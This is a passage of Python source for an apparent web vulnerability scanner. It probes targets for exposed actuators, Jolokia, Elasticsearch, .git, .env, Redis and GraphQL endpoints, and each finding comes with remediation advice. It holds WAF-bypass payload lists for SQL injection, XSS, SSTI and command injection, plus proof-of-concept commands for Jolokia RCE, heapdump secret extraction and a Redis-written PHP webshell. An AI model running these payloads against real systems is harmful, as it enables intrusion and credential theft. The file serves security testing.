                                    f"# Verify token access:\n"
                                    f"curl -sk --header 'PRIVATE-TOKEN: <token>' "
                                    f"'{base}/api/v4/projects'"
                                ),
                                category="Secrets / Tokens",
                                remediation="Revoke token immediately via GitLab UI. Rotate all secrets in CI/CD variables. Enable secret detection in GitLab (Settings > Security). Use SAST scanning."
                            ))
                            break
                    if any(sig in body for sig in ['"id"', '"username"', '"name_with_namespace"']):
                        if "/api/v4" in path:
                            profile.findings.append(Finding(
                                id=f"GITLAB-API-ANON-{path.replace('/','_').strip('_')[:14].upper()}",
                                title=f"GitLab API Unauthenticated Access: {path}",
                                severity="HIGH",
                                cvss=7.5,
                                cwe="CWE-284",
                                description=f"GitLab API endpoint {path} returns data without authentication.",
                                evidence=body[:200],
                                poc_curl=f"curl -sk '{url}'",
                                category="GitLab / Source Control",
                                remediation="Set GitLab visibility to Private. Restrict API to authenticated users. Disable public project access."
                            ))
            except Exception:
                pass
        return profile


class SupplyChainAttackSurface:
    """Detect dependency confusion / namespace confusion attack surface."""
    NAME = "Supply Chain Attack Surface"
    MANIFEST_PATHS = [
        "/package.json", "/package-lock.json", "/yarn.lock",
        "/requirements.txt", "/Pipfile", "/Pipfile.lock",
        "/setup.py", "/setup.cfg", "/pyproject.toml",
        "/pom.xml", "/build.gradle", "/build.gradle.kts",
        "/go.mod", "/go.sum", "/Cargo.toml", "/Cargo.lock",
        "/composer.json", "/composer.lock", "/Gemfile", "/Gemfile.lock",
        "/.npmrc", "/.pypirc", "/nuget.config", "/.rubygems.config",
        "/webpack.config.js", "/rollup.config.js", "/vite.config.js",
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        import re
        base = profile.url.rstrip("/")
        internal_pkg_pattern = re.compile(
            r'"name"\s*:\s*"(@[a-z0-9-]+/[a-z0-9-]+|[a-z0-9-]+-internal|[a-z0-9-]+-private|[a-z0-9-]+-corp)"'
        )
        for path in self.MANIFEST_PATHS:
            url = base + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if r and r.status == 200:
                    body = (r.body or b"").decode("utf-8", errors="replace")
                    pkgs = internal_pkg_pattern.findall(body)
                    profile.findings.append(Finding(
                        id=f"SUPPLY-CHAIN-{path.replace('/','_').strip('_')[:16].upper()}",
                        title=f"Dependency Manifest Exposed: {path}",
                        severity="MEDIUM" if not pkgs else "HIGH",
                        cvss=5.3 if not pkgs else 7.8,
                        cwe="CWE-829",
                        description=(
                            f"Dependency manifest {path} is publicly accessible. "
                            + (f"Internal package names detected: {', '.join(pkgs[:5])} — "
                               "dependency confusion attack possible by publishing same names to public registries."
                               if pkgs else
                               "Package list exposed — allows targeted supply chain attack via typosquatting.")
                        ),
                        evidence=body[:300],
                        poc_curl=f"curl -sk '{url}'",
                        category="Supply Chain",
                        remediation=(
                            "Remove manifest from web root. For internal packages: use private registry "
                            "(Artifactory, GitHub Packages) with scoped namespaces. "
                            "Add 'private': true to package.json. Use npm config set registry."
                        )
                    ))
            except Exception:
                pass
        return profile


class CloudflareOriginBypass:
    """Detect real origin IP via certificate transparency logs and direct connection."""
    NAME = "Cloudflare Origin Bypass"
    CT_URL_TMPL = "https://crt.sh/?q=%.{apex}&output=json"
    SHODAN_DORK = 'ssl.cert.subject.cn:"{host}" http.title:"{title}"'

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        host = profile.host
        apex = profile.apex
        bypass_hints = []
        # Check common origin-reveal paths
        reveal_paths = [
            "/cdn-cgi/trace",
            "/.well-known/security.txt",
            "/server-status",
            "/server-info",
            "/__info",
            "/actuator/info",
        ]
        base = profile.url.rstrip("/")
        for path in reveal_paths:
            url = base + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if r and r.status == 200:
                    body = (r.body or b"").decode("utf-8", errors="replace")
                    if any(sig in body for sig in ["ip=", "server=", "colo=", "uag=", "h=", "ts="]):
                        bypass_hints.append(f"{path}: {body[:120]}")
            except Exception:
                pass
        # Check known historical IPs from DNS records already in profile
        if profile.ip:
            bypass_hints.append(f"Current resolved IP: {profile.ip} — test direct connection bypassing WAF/CDN")
        if profile.subdomains:
            bypass_hints.append(
                f"Subdomains discovered: {', '.join(profile.subdomains[:8])} — "
                "test each for direct-to-origin access bypassing CDN"
            )
        if bypass_hints:
            profile.findings.append(Finding(
                id="CF-ORIGIN-BYPASS-001",
                title="Cloudflare/CDN Origin Bypass Attack Surface",
                severity="MEDIUM",
                cvss=5.3,
                cwe="CWE-441",
                description=(
                    f"Multiple indicators for Cloudflare/CDN origin IP bypass at {host}. "
                    "Direct-to-origin connection bypasses WAF rules, rate limiting, and DDoS protection."
                ),
                evidence="\n".join(bypass_hints),
                poc_curl=(
                    f"# Test direct connection with Host header:\n"
                    f"curl -sk --resolve '{host}:{profile.ip}' 'https://{host}/' "
                    f"-H 'Host: {host}'\n"
                    f"# Check cdn-cgi/trace for origin info:\n"
                    f"curl -sk '{base}/cdn-cgi/trace'"
                ),
                category="CDN Bypass",
                remediation="Configure Cloudflare to block non-Cloudflare IPs (Cloudflare IP ranges only). Enable authenticated origin pulls. Use Argo Tunnel / Cloudflare Access."
            ))
        return profile


class WAFBypassPayloadGen:
    """Generate WAF bypass payload variants for all HIGH/CRITICAL findings."""
    NAME = "WAF Bypass Payload Generator"
    BYPASS_TECHNIQUES = {
        "SQL": [
            "' /*!UNION*/ /*!SELECT*/ 1,2,3-- -",
            "' UNION%0aSELECT%0a1,2,3-- -",
            "' /*!50000UNION*//*!50000SELECT*/ 1,2,3-- -",
            "%27%20UNION%20SELECT%20NULL,NULL,NULL--",
            "' OR 1=1/**/--",
            "';%00SELECT 1,2,3-- -",
            "' OR 'x'='x",
            "1' AND '1'='1",
        ],
        "XSS": [
            "<ScRiPt>alert(1)</ScRiPt>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "javascript:alert(1)",
            "<details open ontoggle=alert(1)>",
            "\"><img src=x onerror=alert`1`>",
            "';alert(String.fromCharCode(88,83,83))//",
            "<iframe srcdoc='&#60;script&#62;alert(1)&#60;/script&#62;'>",
        ],
        "SSTI": [
            "${7*7}", "{{7*7}}", "#{7*7}", "<%= 7*7 %>",
            "{{config}}", "${T(java.lang.Runtime).getRuntime().exec('id')}",
            "{{''.__class__.__mro__[2].__subclasses__()}}",
            "{%25+import+os+%25}{{os.popen('id').read()}}",
        ],
        "CMDI": [
            "; id", "| id", "` id `", "$(id)", "&& id",
            "%0aid", "%0a/bin/sh -c id", ";/bin/sh -c id",
            "||id", ";id%0a",
        ],
        "PATH_TRAVERSAL": [
            "../../../../etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%252F..%252F..%252Fetc%252Fpasswd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
            "..\\..\\..\\..\\windows\\win.ini",
        ],
    }

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        high_findings = [f for f in profile.findings
                         if f.severity in ("CRITICAL", "HIGH")]
        if not high_findings:
            return profile
        for finding in high_findings[:5]:
            category = finding.category
            bypass_key = None
            if "SQL" in category or "sqli" in finding.id.lower():
                bypass_key = "SQL"
            elif "XSS" in category:
                bypass_key = "XSS"
            elif "SSTI" in category or "Template" in category:
                bypass_key = "SSTI"
            elif "Command" in category or "CMDi" in category:
                bypass_key = "CMDI"
            elif "LFI" in category or "Path" in category or "Traversal" in category:
                bypass_key = "PATH_TRAVERSAL"
            if bypass_key:
                payloads = self.BYPASS_TECHNIQUES[bypass_key]
                profile.findings.append(Finding(
                    id=f"WAF-BYPASS-{bypass_key}-{finding.id[:10]}",
                    title=f"WAF Bypass Payloads for {finding.title[:50]}",
                    severity="INFO",
                    cvss=0.0,
                    cwe="CWE-693",
                    description=(
                        f"Generated {len(payloads)} WAF bypass payload variants for {bypass_key} "
                        f"finding '{finding.title}'. Replace baseline PoC payload with these variants "
                        "to evade common WAF signatures (ModSecurity, CloudFlare, Imperva)."
                    ),
                    evidence="\n".join(f"  [{i+1}] {p}" for i, p in enumerate(payloads)),
                    poc_curl=finding.poc_curl,
                    category="WAF Bypass",
                    remediation="WAF bypass payloads confirm the underlying vulnerability exists independent of WAF. Fix the root vulnerability; do not rely on WAF as primary defence."
                ))
        return profile


class WebShellPathDetector:
    """Enumerate common webshell locations and backdoor artifacts on the target."""
    NAME = "Webshell Path Detector"
    WEBSHELL_PATHS = [
        "/c99.php", "/r57.php", "/b374k.php", "/wso.php", "/alfa.php",
        "/indoxploit.php", "/cpanel.php", "/bypass.php", "/cmd.php",
        "/shell.php", "/webshell.php", "/bc.php", "/ek.php", "/1.php",
        "/2.php", "/x.php", "/test.php", "/info.php", "/phpinfo.php",
        "/uploads/shell.php", "/upload/1.php", "/files/shell.php",
        "/tmp/shell.php", "/images/shell.php", "/img/shell.php",
        "/assets/shell.php", "/static/shell.php", "/media/shell.php",
        "/include/shell.php", "/includes/shell.php", "/lib/shell.php",
        "/admin/shell.php", "/wp-content/uploads/shell.php",
        "/wp-includes/shell.php", "/wp-admin/shell.php",
        "/joomla/shell.php", "/administrator/shell.php",
        "/shell.asp", "/shell.aspx", "/cmd.aspx", "/shell.jsp",
        "/shell.cfm", "/shell.shtml", "/shell.pl", "/shell.cgi",
        "/.htaccess", "/.htpasswd",
    ]
    WEBSHELL_SIGS = [
        "eval(", "system(", "exec(", "passthru(", "shell_exec(",
        "assert(", "preg_replace", "base64_decode", "str_rot13",
        "gzinflate", "gzuncompress", "strrev(", "c99shell",
        "r57shell", "FilesMan", "WSO ", "b374k", "indoxploit",
        "Weevely", "cmd=", "command=", "passwd", "shadow",
        "phpinfo", "GLOBALS", "_REQUEST", "_GET", "_POST",
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        base = profile.url.rstrip("/")
        for path in self.WEBSHELL_PATHS:
            url = base + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if r and r.status == 200:
                    body = (r.body or b"").decode("utf-8", errors="replace")
                    hits = [s for s in self.WEBSHELL_SIGS if s.lower() in body.lower()]
                    if hits:
                        profile.findings.append(Finding(
                            id=f"WEBSHELL-{path.replace('/','_').strip('_')[:20].upper()}",
                            title=f"Webshell Detected: {path}",
                            severity="CRITICAL",
                            cvss=10.0,
                            cwe="CWE-434",
                            description=(
                                f"Webshell signatures detected at {path} (HTTP 200). "
                                f"Signatures matched: {', '.join(hits[:5])}. "
                                "Active backdoor — server is compromised."
                            ),
                            evidence=f"HTTP 200 | Signatures: {hits[:5]} | Snippet: {body[:150]}",
                            poc_curl=f"curl -sk '{url}?cmd=id'",
                            category="Webshell / Backdoor",
                            remediation="INCIDENT RESPONSE: Remove webshell immediately. Audit server logs for all access. Rotate all credentials. Rebuild server from clean image if compromise suspected. Notify CISO."
                        ))
            except Exception:
                pass
        return profile


class PrivescPathDetector:
    """Detect Linux privilege escalation hints from API error pages and debug output."""
    NAME = "Privesc Path Detector"
    PRIVESC_PATHS = [
        "/api/debug", "/api/internal", "/debug", "/console",
        "/actuator/env", "/actuator/configprops", "/actuator/beans",
        "/api/v1/admin/debug", "/admin/debug", "/server-status",
        "/server-info", "/__status__", "/_debug", "/phpinfo.php",
        "/info.php", "/test.php", "/api/info", "/diagnostics",
    ]
    PRIVESC_SIGS = [
        "SUDO_", "sudoers", "/etc/sudoers", "sudo -l",
        "suid", "setuid", "/etc/cron", "crontab",
        "PATH=", "LD_PRELOAD", "LD_LIBRARY_PATH",
        "writable", "777", "chmod 777",
        "docker.sock", "docker group",
        "/proc/version", "kernel version",
        "lxc", "lxd", "namespace",
        "cap_setuid", "cap_dac_override", "capabilities",
        "nfs", "no_root_squash",
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        base = profile.url.rstrip("/")
        for path in self.PRIVESC_PATHS:
            url = base + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if r and r.status in (200, 500):
                    body = (r.body or b"").decode("utf-8", errors="replace")
                    hits = [s for s in self.PRIVESC_SIGS if s.lower() in body.lower()]
                    if hits:
                        profile.findings.append(Finding(
                            id=f"PRIVESC-HINT-{path.replace('/','_').strip('_')[:18].upper()}",
                            title=f"Privilege Escalation Path Hints at {path}",
                            severity="HIGH",
                            cvss=7.8,
                            cwe="CWE-269",
                            description=(
                                f"Debug/info endpoint {path} reveals privilege escalation indicators: "
                                f"{', '.join(hits[:5])}. These indicate misconfigured SUID binaries, "
                                "writable cron jobs, Docker socket access, or Linux capability abuse paths."
                            ),
                            evidence=f"Indicators: {hits[:5]}\nSnippet: {body[:200]}",
                            poc_curl=f"curl -sk '{url}'",
                            category="Privilege Escalation",
                            remediation="Disable debug endpoints in production. Remove SUID bits from non-essential binaries. Restrict Docker socket access. Audit cron jobs for world-writable scripts."
                        ))
            except Exception:
                pass
        return profile


class JMXExposedDetector:
    """Detect exposed JMX endpoints enabling Java MBeans RCE."""
    NAME = "JMX Exposed Detector"
    JMX_PATHS = [
        "/jmxrmi", "/jndi/rmi://", "/actuator/jolokia",
        "/jolokia", "/jolokia/list", "/jolokia/version",
        "/jolokia/exec/java.lang:type=Runtime/exec",
        "/hawtio", "/hawtio/index.html",
        "/jmx-console", "/jmx-console/HtmlAdaptor",
        "/invoker/JMXInvokerServlet",
        "/web-console/Invoker",
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        base = profile.url.rstrip("/")
        for path in self.JMX_PATHS:
            url = base + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if r and r.status == 200:
                    body = (r.body or b"").decode("utf-8", errors="replace")
                    if any(sig in body for sig in [
                        "jolokia", "MBean", "java.lang", "JMX",
                        "hawtio", "Runtime", "ClassLoading",
                        "MemoryMXBean", "ThreadMXBean", "exec(",
                        '"value":', '"request":', '"status":200'
                    ]):
                        profile.findings.append(Finding(
                            id=f"JMX-EXPOSED-{path.replace('/','_').strip('_')[:18].upper()}",
                            title=f"JMX/Jolokia RCE Surface Exposed: {path}",
                            severity="CRITICAL",
                            cvss=9.8,
                            cwe="CWE-284",
                            description=(
                                f"Jolokia/JMX endpoint {path} is accessible. "
                                "Enables Java MBeans RCE via exec MBean, ClassLoader injection, "
                                "or JNDI LDAP/RMI callback (Log4Shell-style). "
                                "Full OS command execution on the server."
                            ),
                            evidence=body[:200],
                            poc_curl=(
                                f"curl -sk '{url}'\n"
                                f"# RCE via Jolokia exec:\n"
                                f"curl -sk '{base}/jolokia/exec/java.lang:type=Runtime/exec/id'"
                            ),
                            category="JMX / Java RCE",
                            remediation="Restrict Jolokia to localhost. Add authentication to hawtio. Disable JMX remote port. Apply Spring Boot actuator security configuration."
                        ))
            except Exception:
                pass
        return profile


class SpringActuatorFullExposure:
    """Detect Spring Boot actuator full exposure — env, heapdump, logfile, shutdown."""
    NAME = "Spring Actuator Full Exposure"
    ACTUATOR_PATHS = [
        ("/actuator",              "Actuator index — all endpoints listed"),
        ("/actuator/env",          "Environment variables — secrets/credentials"),
        ("/actuator/configprops",  "Configuration properties — DB passwords, API keys"),
        ("/actuator/beans",        "Spring beans — full application context"),
        ("/actuator/mappings",     "Request mappings — full URL routing table"),
        ("/actuator/heapdump",     "Heap dump — extract secrets from JVM memory"),
        ("/actuator/threaddump",   "Thread dump — internal state"),
        ("/actuator/logfile",      "Application log file"),
        ("/actuator/httptrace",    "HTTP request trace — auth tokens in headers"),
        ("/actuator/auditevents",  "Security audit events — login attempts"),
        ("/actuator/shutdown",     "Remote shutdown — POST to kill server"),
        ("/actuator/restart",      "Remote restart"),
        ("/actuator/refresh",      "Config refresh — reload remote config"),
        ("/env",                   "Actuator env (non-prefixed)"),
        ("/metrics",               "Metrics — request counts, JVM stats"),
        ("/health",                "Health endpoint — dependency status"),
        ("/info",                  "Info endpoint — build/git metadata"),
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        base = profile.url.rstrip("/")
        for path, desc in self.ACTUATOR_PATHS:
            url = base + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if r and r.status == 200:
                    body = (r.body or b"").decode("utf-8", errors="replace")
                    if any(sig in body for sig in [
                        '"_links"', '"beans"', '"contexts"', '"activeProfiles"',
                        '"propertySources"', '"mappings"', '"dispatcherServlets"',
                        "password", "secret", "token", "key", "datasource",
                        "jdbc:", "redis://", "amqp://", "mongodb://",
                        "PK\x03\x04",  # ZIP magic (heapdump)
                    ]):
                        sev = "CRITICAL" if "heapdump" in path or "env" in path or "shutdown" in path else "HIGH"
                        profile.findings.append(Finding(
                            id=f"ACTUATOR-{path.replace('/','_').strip('_')[:18].upper()}",
                            title=f"Spring Boot Actuator Exposed: {desc}",
                            severity=sev,
                            cvss=9.1 if sev == "CRITICAL" else 7.5,
                            cwe="CWE-200",
                            description=(
                                f"Spring Boot Actuator endpoint {path} is accessible without authentication. "
                                f"{desc}. "
                                "Heapdump contains all JVM memory including plaintext passwords, tokens, "
                                "and crypto keys. Env exposes application.properties secrets."
                            ),
                            evidence=body[:300],
                            poc_curl=(
                                f"curl -sk '{url}'\n"
                                f"# Extract secrets from heapdump:\n"
                                f"curl -sk '{base}/actuator/heapdump' -o /tmp/heap.hprof && "
                                f"strings /tmp/heap.hprof | grep -i 'password\\|secret\\|token\\|key' | head -50"
                            ),
                            category="Spring Boot Actuator",
                            remediation="Apply Spring Security to actuator endpoints. Set management.endpoints.web.exposure.include=health,info only. Require authentication for all actuator paths. Disable heapdump and shutdown endpoints."
                        ))
            except Exception:
                pass
        return profile


class ElasticsearchExposedDetector:
    """Detect exposed Elasticsearch cluster and enumerate indices."""
    NAME = "Elasticsearch Exposed Detector"
    ES_PATHS = [
        "/_cat/indices?v",
        "/_cat/nodes?v",
        "/_cat/aliases?v",
        "/_cluster/health",
        "/_cluster/settings",
        "/_nodes",
        "/_security/user",
        "/_xpack/security/user",
        "/_all/_search?q=*&size=1",
        "/_mapping",
        "/_template",
        "/_snapshot",
        "/_tasks",
        "/",
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        base = profile.url.rstrip("/")
        for path in self.ES_PATHS:
            url = base + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if r and r.status == 200:
                    body = (r.body or b"").decode("utf-8", errors="replace")
                    if any(sig in body for sig in [
                        '"cluster_name"', '"indices"', '"nodes"',
                        '"shards"', '"hits"', '"mappings"',
                        '"version":{', '"number":', '"tagline"',
                        "You Know, for Search", '"status":"green"',
                        '"status":"yellow"', '"status":"red"',
                    ]):
                        profile.findings.append(Finding(
                            id=f"ELASTIC-{path.replace('/','_').strip('_')[:18].upper()}",
                            title=f"Elasticsearch Cluster Exposed: {path}",
                            severity="CRITICAL",
                            cvss=9.8,
                            cwe="CWE-284",
                            description=(
                                f"Elasticsearch endpoint {path} is accessible without authentication. "
                                "Allows full data exfiltration from all indices, cluster takeover, "
                                "snapshot creation, and remote code execution via Groovy/Painless scripts."
                            ),
                            evidence=body[:300],
                            poc_curl=(
                                f"curl -sk '{url}'\n"
                                f"# Dump all indices:\n"
                                f"curl -sk '{base}/_cat/indices?v'\n"
                                f"# Search all data:\n"
                                f"curl -sk '{base}/_all/_search?q=password&size=100'"
                            ),
                            category="Database Exposure",
                            remediation="Enable X-Pack security. Bind Elasticsearch to 127.0.0.1. Add authentication (basic_auth or API key). Apply network-level firewall. Never expose port 9200/9300 publicly."
                        ))
                        break
            except Exception:
                pass
        return profile


class GitRepoExposedDetector:
    """Detect exposed .git repository enabling full source code extraction."""
    NAME = "Git Repo Exposed Detector"
    GIT_PATHS = [
        "/.git/HEAD",
        "/.git/config",
        "/.git/COMMIT_EDITMSG",
        "/.git/index",
        "/.git/logs/HEAD",
        "/.git/refs/heads/main",
        "/.git/refs/heads/master",
        "/.git/refs/heads/develop",
        "/.git/ORIG_HEAD",
        "/.git/packed-refs",
        "/.git/info/exclude",
        "/.git/description",
        "/gitdumper.sh",  # check if already dumped
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        base = profile.url.rstrip("/")
        git_found = []
        for path in self.GIT_PATHS:
            url = base + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if r and r.status == 200:
                    body = (r.body or b"").decode("utf-8", errors="replace")
                    if any(sig in body for sig in [
                        "ref: refs/", "[core]", "repositoryformatversion",
                        "filemode", "bare = false", "logallrefupdates",
                        "MERGE_MSG", "Initial commit", "[remote",
                        "[branch", "Unnamed repository"
                    ]):
                        git_found.append((path, body[:100]))
            except Exception:
                pass
        if git_found:
            profile.findings.append(Finding(
                id="GIT-REPO-EXPOSED-001",
                title=".git Repository Exposed — Full Source Code Extraction Possible",
                severity="CRITICAL",
                cvss=9.8,
                cwe="CWE-538",
                description=(
                    f"Exposed .git directory at {base}/.git/. "
                    f"Found {len(git_found)} accessible git internals. "
                    "Full source code, commit history, credentials in code, and "
                    "internal architecture can be extracted using git-dumper."
                ),
                evidence="\n".join(f"  {p}: {s}" for p, s in git_found[:5]),
                poc_curl=(
                    f"# Extract full repository:\n"
                    f"pip install git-dumper && git-dumper '{base}/.git/' /tmp/repo/\n"
                    f"# Or manually:\n"
                    f"curl -sk '{base}/.git/config'\n"
                    f"curl -sk '{base}/.git/HEAD'"
                ),
                category="Source Disclosure",
                remediation="Block access to /.git/ via web server config (Nginx: location ~* /\\.git { deny all; }). Remove .git directory from web root. Use deployment pipelines that exclude .git."
            ))
        return profile


class EnvFileLeakDetector:
    """Detect .env, .env.local, .env.production and similar secret file exposure."""
    NAME = "Env File Leak Detector"
    ENV_PATHS = [
        "/.env", "/.env.local", "/.env.production", "/.env.staging",
        "/.env.development", "/.env.test", "/.env.backup",
        "/.env.bak", "/.env.old", "/.env.example",
        "/config/.env", "/app/.env", "/src/.env",
        "/.env.docker", "/.env.ci", "/.envrc",
        "/config/database.yml", "/config/application.yml",
        "/config/secrets.yml", "/config/credentials.yml",
        "/application.properties", "/application.yml",
        "/application-prod.properties", "/application-staging.properties",
        "/config.php", "/configuration.php", "/wp-config.php",
        "/wp-config.php.bak", "/wp-config.php~", "/web.config",
        "/appsettings.json", "/appsettings.Production.json",
        "/.aws/credentials", "/.aws/config",
        "/credentials.json", "/service-account.json",
        "/firebase.json", "/.firebaserc",
    ]
    SECRET_SIGS = [
        "DB_PASSWORD", "DB_PASS", "DATABASE_URL", "DATABASE_PASSWORD",
        "SECRET_KEY", "SECRET", "API_KEY", "API_SECRET",
        "AWS_ACCESS_KEY", "AWS_SECRET_KEY", "AWS_SESSION_TOKEN",
        "STRIPE_SECRET", "STRIPE_KEY", "PAYPAL_SECRET",
        "PRIVATE_KEY", "OAUTH_SECRET", "JWT_SECRET",
        "MAIL_PASSWORD", "SMTP_PASSWORD", "SENDGRID_API_KEY",
        "REDIS_PASSWORD", "MONGODB_URI", "POSTGRES_PASSWORD",
        "PASSWORD", "PASS", "TOKEN", "AUTH",
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        base = profile.url.rstrip("/")
        for path in self.ENV_PATHS:
            url = base + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if r and r.status == 200:
                    body = (r.body or b"").decode("utf-8", errors="replace")
                    hits = [s for s in self.SECRET_SIGS if s in body.upper()]
                    if hits or "=" in body:
                        profile.findings.append(Finding(
                            id=f"ENV-LEAK-{path.replace('/','_').strip('_')[:18].upper()}",
                            title=f"Environment/Config File Exposed: {path}",
                            severity="CRITICAL" if hits else "HIGH",
                            cvss=9.8 if hits else 7.5,
                            cwe="CWE-538",
                            description=(
                                f"Environment file {path} is publicly accessible. "
                                + (f"Secret keys detected: {', '.join(hits[:5])}. "
                                   if hits else "Contains KEY=VALUE pairs. ")
                                + "Exposes database credentials, API keys, cloud credentials, "
                                "and encryption secrets."
                            ),
                            evidence=body[:400],
                            poc_curl=f"curl -sk '{url}'",
                            category="Secrets / Config",
                            remediation="Remove .env files from web root immediately. Rotate ALL exposed secrets. Block .env access in web server config. Use secrets manager (Vault, AWS Secrets Manager, Azure Key Vault) instead of .env files."
                        ))
            except Exception:
                pass
        return profile


class BackupFileLeakDetector:
    """Detect backup and temporary files exposing source code and configuration."""
    NAME = "Backup File Leak Detector"
    BACKUP_EXTS = [".bak", ".old", ".orig", ".backup", ".copy", ".swp",
                   ".swo", "~", ".tmp", ".temp", ".save", ".1", ".2"]
    COMMON_TARGETS = [
        "index", "config", "database", "db", "admin", "login",
        "app", "application", "main", "core", "api", "auth",
        "user", "users", "password", "pass", "secret", "key",
        "settings", "configuration", "web", "server", "site",
    ]
    ARCHIVE_PATHS = [
        "/backup.zip", "/backup.tar.gz", "/backup.tar",
        "/site.zip", "/www.zip", "/html.zip", "/htdocs.zip",
        "/public_html.zip", "/web.zip", "/website.zip",
        "/db.sql", "/database.sql", "/dump.sql", "/backup.sql",
        "/data.sql", "/mysql.sql", "/postgres.sql",
        "/backup.tar.bz2", "/src.zip", "/source.zip",
        "/files.tar.gz", "/export.zip", "/archive.zip",
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        base = profile.url.rstrip("/")
        probe_paths = self.ARCHIVE_PATHS[:]
        for name in self.COMMON_TARGETS:
            for ext in self.BACKUP_EXTS:
                probe_paths.append(f"/{name}.php{ext}")
                probe_paths.append(f"/{name}{ext}")
        for path in probe_paths[:60]:
            url = base + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if r and r.status == 200:
                    ctype = r.headers.get("content-type", "")
                    body = (r.body or b"")[:200].decode("utf-8", errors="replace")
                    if (any(sig in body for sig in ["<?php", "password", "secret",
                                                     "DB_", "define(", "CREATE TABLE",
                                                     "INSERT INTO", "PK\x03\x04"])
                            or "zip" in ctype or "gzip" in ctype or "sql" in ctype
                            or "octet-stream" in ctype):
                        profile.findings.append(Finding(
                            id=f"BACKUP-LEAK-{path.replace('/','_').strip('_')[:18].upper()}",
                            title=f"Backup/Temp File Exposed: {path}",
                            severity="HIGH",
                            cvss=7.5,
                            cwe="CWE-530",
                            description=(
                                f"Backup or temporary file {path} is accessible (HTTP 200, {len(r.body or b'')} bytes). "
                                "May contain source code, database dumps, credentials, or application configuration."
                            ),
                            evidence=f"HTTP 200 | Content-Type: {ctype} | Snippet: {body[:100]}",
                            poc_curl=f"curl -sk -o /tmp/backup '{url}'",
                            category="Backup Files",
                            remediation="Delete all backup files from web root. Configure web server to deny access to backup extensions. Automate cleanup in CI/CD pipeline."
                        ))
            except Exception:
                pass
        return profile


class RedisExposedDetector:
    """Detect Redis exposed without authentication via HTTP and port indicators."""
    NAME = "Redis Exposed Detector"
    REDIS_PATHS = [
        "/redis", "/redis/info", "/api/redis",
        "/debug/redis", "/admin/redis",
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        base = profile.url.rstrip("/")
        for path in self.REDIS_PATHS:
            url = base + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if r and r.status == 200:
                    body = (r.body or b"").decode("utf-8", errors="replace")
                    if any(sig in body for sig in [
                        "redis_version", "used_memory", "connected_clients",
                        "aof_enabled", "rdb_last_save_time", "keyspace_hits",
                        "+OK", "-ERR", "+PONG", "redis.clients",
                    ]):
                        profile.findings.append(Finding(
                            id=f"REDIS-EXPOSED-{path.replace('/','_').strip('_')[:16].upper()}",
                            title=f"Redis Exposed/Proxied at {path}",
                            severity="CRITICAL",
                            cvss=9.8,
                            cwe="CWE-284",
                            description=(
                                f"Redis data is accessible at {path}. "
                                "Unauthenticated Redis allows: full data dump (session tokens, "
                                "cached credentials), CONFIG SET to write arbitrary files (SSH keys, "
                                "cron jobs, webshells), and slave replication for persistence."
                            ),
                            evidence=body[:200],
                            poc_curl=(
                                f"curl -sk '{url}'\n"
                                f"# Redis RCE via config set + slave:\n"
                                f"redis-cli -h {profile.host} CONFIG SET dir /var/www/html\n"
                                f"redis-cli -h {profile.host} CONFIG SET dbfilename shell.php\n"
                                f'redis-cli -h {profile.host} SET payload "<?php system($_GET[\'cmd\']); ?>"\n'
                                f"redis-cli -h {profile.host} BGSAVE"
                            ),
                            category="Database Exposure",
                            remediation="Require Redis AUTH. Bind to 127.0.0.1 only. Use Redis ACL. Block port 6379 at firewall. Enable protected-mode. Never proxy Redis commands via HTTP."
                        ))
            except Exception:
                pass
        return profile


class GraphQLBatchDOSDetector:
    """Detect GraphQL batch DoS / alias amplification attack surface."""
    NAME = "GraphQL Batch DoS Detector"
    GQL_ENDPOINTS = ["/graphql", "/api/graphql", "/v1/graphql",
                     "/query", "/gql", "/api/query", "/graphiql"]
    BATCH_QUERY_TMPL = (
        "query BatchDoS {{"
        + " ".join(f"a{i}: __typename" for i in range(200))
        + "}}"
    )
    NESTED_QUERY = (
        "query NestedDoS { __type(name: \"Query\") { "
        "fields { type { fields { type { fields { type { "
        "fields { name } } } } } } } } }"
    )
    INTROSPECT_FRAGMENT = (
        "query FragmentDoS { ...F } fragment F on Query { ...F }"
    )

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        base = profile.url.rstrip("/")
        for ep in self.GQL_ENDPOINTS:
            url = base + ep
            for label, query in [
                ("batch-alias-200", self.BATCH_QUERY_TMPL),
                ("nested-introspect", self.NESTED_QUERY),
                ("circular-fragment", self.INTROSPECT_FRAGMENT),
            ]:
                try:
                    payload = json.dumps({"query": query}).encode()
                    t0 = time.time()
                    r = _fetch(url, cfg.ua, cfg.timeout + 5, "POST", payload,
                               {"Content-Type": "application/json"})
                    elapsed = time.time() - t0
                    if r and r.status == 200:
                        body = (r.body or b"").decode("utf-8", errors="replace")
                        alias_count = body.count('"a')
                        if alias_count > 50 or elapsed > 3.0:
                            profile.findings.append(Finding(
                                id=f"GQL-BATCHDOS-{label.upper()[:16]}-{ep.replace('/','_')[:8].upper()}",
